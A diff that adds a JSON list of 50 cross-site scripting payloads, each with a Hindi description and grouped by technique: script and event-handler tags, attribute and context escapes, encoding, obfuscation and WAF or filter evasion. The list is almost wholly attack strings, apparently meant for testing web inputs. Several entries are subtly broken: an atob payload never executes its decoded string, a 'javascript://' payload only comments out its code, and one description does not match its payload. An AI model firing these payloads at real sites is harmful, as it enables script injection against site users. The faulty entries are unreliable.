@@ -1,0 +1,302 @@
+[
+  {
+    "id": 1,
+    "category": "Basic Tag Injection",
+    "payload": "<script>alert(1)</script>",
+    "description": "यह इनपुट फ़ील्ड की बुनियादी जाँच करने के लिए एक क्लासिक स्क्रिप्ट टैग है कि क्या वह बिना किसी फ़िल्टर के कोड रन कर रहा है।"
+  },
+  {
+    "id": 2,
+    "category": "Basic Tag Injection",
+    "payload": "<script>prompt(1)</script>",
+    "description": "यह alert() का एक विकल्प है, जिसका उपयोग अक्सर उन जगहों पर किया जाता है जहाँ अलर्ट बॉक्स को ब्लॉक या मॉनिटर किया जाता है।"
+  },
+  {
+    "id": 3,
+    "category": "Basic Tag Injection",
+    "payload": "<script>confirm(1)</script>",
+    "description": "यह जावास्क्रिप्ट के काम करने की क्षमता की पुष्टि करने के लिए 'confirm' डायलॉग बॉक्स का उपयोग करता है।"
+  },
+  {
+    "id": 4,
+    "category": "Image Event Handler",
+    "payload": "<img src=x onerror=alert(1)>",
+    "description": "यह उन बुनियादी फ़िल्टर्स को बाईपास करता है जो केवल <script> टैग को ढूंढते हैं। इसमें इमेज लोड न होने पर onerror इवेंट चालू हो जाता है।"
+  },
+  {
+    "id": 5,
+    "category": "Image Event Handler",
+    "payload": "<img src=\"javascript:alert(1)\">",
+    "description": "यह पुराने ब्राउज़रों को टारगेट करने वाली तकनीक है जो इमेज के सोर्स पाथ के अंदर ही जावास्क्रिप्ट को रन कर देती है।"
+  },
+  {
+    "id": 6,
+    "category": "SVG Vector",
+    "payload": "<svg onload=alert(1)>",
+    "description": "आधुनिक वेब ऐप्स के लिए एक बेहतरीन तकनीक; यह स्केलेबल वेक्टर ग्राफिक्स (SVG) एलिमेंट के लोड होते ही तुरंत कोड रन करता है।"
+  },
+  {
+    "id": 7,
+    "category": "SVG Vector",
+    "payload": "<svg><script>alert(1)</script></svg>",
+    "description": "कड़े HTML-only फ़िल्टर्स को धोखा देने के लिए यह एक साधारण स्क्रिप्ट टैग को SVG कंटेनर के अंदर लपेटता है।"
+  },
+  {
+    "id": 8,
+    "category": "Body Event Handler",
+    "payload": "<body onload=alert(1)>",
+    "description": "जैसे ही पेज का मुख्य बॉडी हिस्सा पूरी तरह लोड हो जाता है, यह पpayload तुरंत बैकग्राउंड में रन हो जाता है।"
+  },
+  {
+    "id": 9,
+    "category": "Body Event Handler",
+    "payload": "<body onscroll=alert(1)><br><br><br><br><input autofocus>",
+    "description": "यह ब्राउज़र को स्वचालित रूप से नीचे स्क्रॉल करने पर मजबूर करता है, जिससे onscroll इवेंट तुरंत ट्रिगर हो जाता है।"
+  },
+  {
+    "id": 10,
+    "category": "Iframe Vector",
+    "payload": "<iframe src=\"javascript:alert(1)\"></iframe>",
+    "description": "यह वेबसाइट के अंदर एक इनलाइन फ्रेम (Iframe) बनाकर सीधे जावास्क्रिप्ट कोड को लोड करने का रास्ता खोलता है।"
+  },
+  {
+    "id": 11,
+    "category": "Iframe Vector",
+    "payload": "<iframe onload=alert(1)></iframe>",
+    "description": "जैसे ही एम्बेडेड iframe एलिमेंट पेज पर लोड होता है, यह तुरंत स्क्रिप्ट को फायर कर देता है।"
+  },
+  {
+    "id": 12,
+    "category": "Input Event Handler",
+    "payload": "<input type=text autofocus onfocus=alert(1)>",
+    "description": "यह HTML5 के 'autofocus' का उपयोग करके इनपुट बॉक्स पर तुरंत फोकस लाता है और onfocus इवेंट को तुरंत चला देता।"
+  },
+  {
+    "id": 13,
+    "category": "Input Event Handler",
+    "payload": "<input type=image src=x onerror=alert(1)>",
+    "description": "यह फॉर्म इनपुट स्ट्रक्चर के भीतर इमेज सोर्स फेलियर (त्रुटि) पैटर्न का उपयोग करके कोड निष्पादित करता है।"
+  },
+  {
+    "id": 14,
+    "category": "Link Injection",
+    "payload": "<a href=\"javascript:alert(1)\">Click Here</a>",
+    "description": "इसके लिए यूजर के क्लिक की आवश्यकता होती है; जब कोई यूजर इस लिंक पर क्लिक करेगा तब जावास्क्रिप्ट एक्टिव होगी।"
+  },
+  {
+    "id": 15,
+    "category": "Details Tag Vector",
+    "payload": "<details open ontoggle=alert(1)>",
+    "description": "यह <details> टैग के 'open' एट्रिब्यूट का उपयोग करके एक ऑटोमैटिक टॉगल इवेंट शुरू करता है जो तुरंत कोड चलाता है।"
+  },
+  {
+    "id": 16,
+    "category": "Video Tag Vector",
+    "payload": "<video><source onerror=alert(1)></video>",
+    "description": "HTML5 वीडियो सबकंपोनेंट को एक गलत मीडिया पाथ देकर जानबूझकर एरर और स्क्रिप्ट ट्रिगर की जाती है।"
+  },
+  {
+    "id": 17,
+    "category": "Audio Tag Vector",
+    "payload": "<audio src=x onerror=alert(1)>",
+    "description": "HTML5 ऑडियो एलिमेंट के सोर्स फेलियर इवेंट पाथवे का लाभ उठाकर स्क्रिप्ट को रन करने की तकनीक।"
+  },
+  {
+    "id": 18,
+    "category": "Marquee Tag Vector",
+    "payload": "<marquee onstart=alert(1)>",
+    "description": "पुराने लेआउट इंजनों पर चलते ही स्वचालित रूप से स्क्रिप्ट लोड करने के लिए लेगेसी marquee कंटेनर इवेंट का उपयोग करता है।"
+  },
+  {
+    "id": 19,
+    "category": "Attribute Escape",
+    "payload": "\"><script>alert(1)</script>",
+    "description": "यह पहले से खुले हुए HTML एट्रिब्यूट और टैग को बंद करता है और उसके तुरंत बाद एक नया काम करने वाला स्क्रिप्ट ब्लॉक शुरू करता है।"
+  },
+  {
+    "id": 20,
+    "category": "Attribute Escape",
+    "payload": "';alert(1);//",
+    "description": "बैकएंड सर्वर फ़ाइल के अंदर सीधे मैप किए गए इनलाइन जावास्क्रिप्ट वेरिएबल्स से बाहर निकलने (escape) के लिए उपयोग किया जाता है।"
+  },
+  {
+    "id": 21,
+    "category": "Attribute Escape",
+    "payload": "\"-alert(1)-\"",
+    "description": "यदि कोटेशन प्रोसेसिंग कंट्रोल्स कमजोर हैं, तो यह सीधे स्ट्रिंग ऑपरेशन्स के अंदर इनलाइन एक्जीक्यूशन फ़ंक्शन को इंजेक्ट करता है।"
+  },
+  {
+    "id": 22,
+    "category": "Case Permutation",
+    "payload": "<sCrIpT>alert(1)</sCrIpT>",
+    "description": "यह उन कमजोर रेगुलर एक्सप्रेशन फ़िल्टर्स को चकमा देता है जो केवल लोअरकेस '<script>' शब्दों की जाँच करते हैं।"
+  },
+  {
+    "id": 23,
+    "category": "Case Permutation",
+    "payload": "<ImG SrC=x OnErRoR=alert(1)>",
+    "description": "सिंपल स्ट्रिंग ब्लैकलिस्ट से बचने के लिए इवेंट हैंडलर स्ट्रिंग्स में अपर और लोअरकेस अक्षरों के मिश्रण का उपयोग करता है।"
+  },
+  {
+    "id": 24,
+    "category": "Nested Tag Filter Evasion",
+    "payload": "<scr<script>ipt>alert(1)</script>",
+    "description": "यह उन फ़िल्टर्स के लिए है जो केवल एक बार '<script>' शब्द को हटाते हैं, जिससे बचा हुआ हिस्सा दोबारा जुड़कर स्क्रिप्ट टैग बन जाता है।"
+  },
+  {
+    "id": 25,
+    "category": "Null Byte Evasion",
+    "payload": "<%00script>alert(1)</script>",
+    "description": "लेगेसी फ्रेमवर्क में फ़ाइल पार्सर वैलिडेशन लॉजिक को रोकने के लिए एक यूआरएल-एन्कोडेड नल बाइट कैरेक्टर जोड़ता है।"
+  },
+  {
+    "id": 26,
+    "category": "JavaScript Pseudo-Protocol",
+    "payload": "javascript://alert(1)",
+    "description": "मानक इनपुट पार्सिंग रूटीन को दरकिनार करने के लिए लेगेसी प्रोटोकॉल स्ट्रिंग्स के अंदर कमेंट-हैंडलिंग का लाभ उठाता है।"
+  },
+  {
+    "id": 27,
+    "category": "No Parentheses Execution",
+    "payload": "<script>alert`1`</script>",
+    "description": "ब्रैकेट्स '(' और ')' को ब्लॉक करने वाले फ़िल्टर्स को बाईपास करने के लिए जावास्क्रिप्ट टेम्पलेट लिटरल्स (बैकटिक्स) का उपयोग करता है।"
+  },
+  {
+    "id": 28,
+    "category": "No Parentheses Execution",
+    "payload": "<svg onload=\"window.onerror=eval;throw'=alert\\u00281\\u0029'\">",
+    "description": "यह एरर हैंडलर बाइंडिंग्स को बदल देता है ताकि बिना सीधे ब्रैकेट एंट्री के कस्टम स्क्रिप्ट को रन कराया जा सके।"
+  },
+  {
+    "id": 29,
+    "category": "Encoding Bypass",
+    "payload": "%3Cscript%3Ealert(1)%3C/script%3E",
+    "description": "यह जांचता है कि क्या बैकएंड सर्वर यूआरएल-एन्कोडेड यूजर इनपुट को बिना एस्केप किए सीधे रॉ HTML सामग्री में बदल रहा है।"
+  },
+  {
+    "id": 30,
+    "category": "Encoding Bypass",
+    "payload": "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
+    "description": "हेक्साडेसिमल HTML एंटिटी नोटेशन का उपयोग करके यह पता लगाता है कि क्लाइंट-साइड इनपुट सुरक्षित रूप से रेंडर हो रहा है या नहीं।"
+  },
+  {
+    "id": 31,
+    "category": "Encoding Bypass",
+    "payload": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
+    "description": "रॉ JSON एंडपॉइंट्स के भीतर एप्लिकेशन सैनिटाइजेशन की जांच करने के लिए मानक यूनिकोड एस्केप अनुक्रमों का उपयोग करता है।"
+  },
+  {
+    "id": 32,
+    "category": "DOM-Based Target",
+    "payload": "javascript:alert(1)",
+    "description": "एक साफ पेलोड संरचना जिसे सीधे location.href या window.open जैसे सिंक (sinks) को भेजा जा सकता है।"
+  },
+  {
+    "id": 33,
+    "category": "DOM-Based Target",
+    "payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+    "description": "डॉक्यूमेंट कॉन्टेक्स्ट फ़िल्टर्स से पूरी तरह स्वतंत्र एक अलग स्क्रिप्ट निष्पादन स्पेस लोड करने के लिए बेस64-एन्कोडेड डेटा यूआरएल का उपयोग करता है।"
+  },
+  {
+    "id": 34,
+    "category": "Event Handler Breakout",
+    "payload": "x\" onfocus=\"alert(1)",
+    "description": "एक इनपुट फ़ील्ड ब्रेकआउट तकनीक जो सीधे इनपुट प्रोसेसिंग लेआउट के भीतर कस्टम इवेंट बाइंडिंग्स जोड़ती है।"
+  },
+  {
+    "id": 35,
+    "category": "Event Handler Breakout",
+    "payload": "x' onmouseover='alert(1)",
+    "description": "यह एक ऐसा एक्शन ट्रिगर इंजेक्ट करता है जो यूजर द्वारा माउस कर्सर को उस बॉक्स पर ले जाते ही तुरंत एक्टिव हो जाता है।"
+  },
+  {
+    "id": 36,
+    "category": "Mathematical Evasion",
+    "payload": "<script>alert(parseInt('1',10))</script>",
+    "description": "मूल नंबरों को सुरक्षा प्रणालियों से छिपाने के लिए जावास्क्रिप्ट के इन-बिल्ट parseInt फ़ंक्शन का उपयोग करके बदलता है।"
+  },
+  {
+    "id": 37,
+    "category": "Obfuscation",
+    "payload": "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
+    "description": "'alert(1)' को डेसिमल ASCII कोड में बदलकर String.fromCharCode() की मदद से स्टेटिक डिटेक्शन को पूरी तरह फेल करता है।"
+  },
+  {
+    "id": 38,
+    "category": "Obfuscation",
+    "payload": "<script>window['al'+'ert'](1)</script>",
+    "description": "कड़े और फिक्स कीवर्ड चेक्स को तोड़ने के लिए मुख्य एग्जीक्यूशन शब्दों को टुकड़ों और प्लस (+) ऑपरेटर में विभाजित करता है।"
+  },
+  {
+    "id": 39,
+    "category": "Obfuscation",
+    "payload": "<script>atob('YWxlcnQoMSk=')</script>",
+    "description": "रनटाइम के दौरान बेस64 एनकोडेड कमांड को डिकोड और रन करने के लिए इन-बिल्ट window.atob विधि का उपयोग करता है।"
+  },
+  {
+    "id": 40,
+    "category": "Context Escape",
+    "payload": "</textarea><script>alert(1)</script>",
+    "description": "सक्रिय स्क्रिप्ट इंजेक्ट करने से पहले खुले हुए टेक्स्ट एरिया फ़ील्ड कंटेनर को तुरंत बंद (collapse) करने के लिए मजबूर करता है।"
+  },
+  {
+    "id": 41,
+    "category": "Context Escape",
+    "payload": "--> <script>alert(1)</script>",
+    "description": "वेबसाइट के छुपे हुए कमेंट ब्लॉग्स (Comment Wrappers) से बाहर निकलकर स्क्रिप्ट को ब्राउज़र व्यू में एक्टिव करने के लिए।"
+  },
+  {
+    "id": 42,
+    "category": "Context Escape",
+    "payload": "\n\n<script>alert(1)</script>",
+    "description": "मेटाडेटा हेडर स्पेस मापदंडों को बंद करके सक्रिय टेस्टिंग स्क्रिप्ट को दस्तावेज़ नोड्स के भीतर साफ-सुथरा रखता है।"
+  },
+  {
+    "id": 43,
+    "category": "Object Vector",
+    "payload": "<object data=\"javascript:alert(1)\">",
+    "description": "डेटा एट्रिब्यूट्स के भीतर सीधे जावास्क्रिप्ट पाथ को कॉल करने के लिए इंटरैक्टिव ऑब्जेक्ट टैग का उपयोग करता है।"
+  },
+  {
+    "id": 44,
+    "category": "Embed Vector",
+    "payload": "<embed src=\"javascript:alert(1)\">",
+    "description": "ढीली क्रॉस-ओरिजिन लेआउट नीतियों को टारगेट करने के लिए वैकल्पिक गतिशील सामग्री टैग का उपयोग करता है।"
+  },
+  {
+    "id": 45,
+    "category": "Animate Vector",
+    "payload": "<animate attributeName=\"href\" values=\"javascript:alert(1)\">",
+    "description": "एलिमेंट पार्सिंग ऑपरेशन्स के दौरान सीधे जावास्क्रिप्ट चलाने के लिए SVG SMIL एनिमेशन घटकों का उपयोग करता है।"
+  },
+  {
+    "id": 46,
+    "category": "Advanced Vector",
+    "payload": "<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\">",
+    "description": "मानक बाहरी लिंक फ़िल्टर प्रणालियों को बायपास करने के लिए सीधे सोर्स पाथ में इनलाइन डेटा स्कीमा लोड करता है।"
+  },
+  {
+    "id": 47,
+    "category": "WAF Evasion",
+    "payload": "<base href=\"javascript:alert(1)//\">",
+    "description": "क्लिक प्रोसेसिंग को हाइजैक करने के लिए पेज के मुख्य बेस रिज़ॉल्यूशन पाथ (Base Link Location) को ओवरराइट करने का प्रयास करता है।"
+  },
+  {
+    "id": 48,
+    "category": "WAF Evasion",
+    "payload": "<a href=\"#\" onmouseover=\"alert(1)\">Test</a>",
+    "description": "सिग्नेचर डिटेक्शन प्रोफाइल को न्यूनतम करने के लिए माउस होवर इवेंट मॉनिटर के साथ हल्के स्ट्रक्चरल टैग का उपयोग करता है।"
+  },
+  {
+    "id": 49,
+    "category": "WAF Evasion",
+    "payload": "<body onpageshow=\"alert(1)\">",
+    "description": "फॉरवर्ड/बैक नेविगेशन के दौरान कोड एक्जीक्यूशन लूप को स्वचालित रूप से ट्रिगर करने के लिए सेकेंडरी पेज प्रेजेंटेशन स्टेट का लाभ उठाता है।"
+  },
+  {
+    "id": 50,
+    "category": "WAF Evasion",
+    "payload": "<iframe srcdoc=\"<img src=x onerror=alert(1)>\">",
+    "description": "iframe के srcdoc एट्रिब्यूट का उपयोग करके एन्कोडेड स्ट्रिंग भेजता है, जो चाइल्ड कॉन्टेक्स्ट के अंदर डिकोड और रन होती है।"
+  }
+]
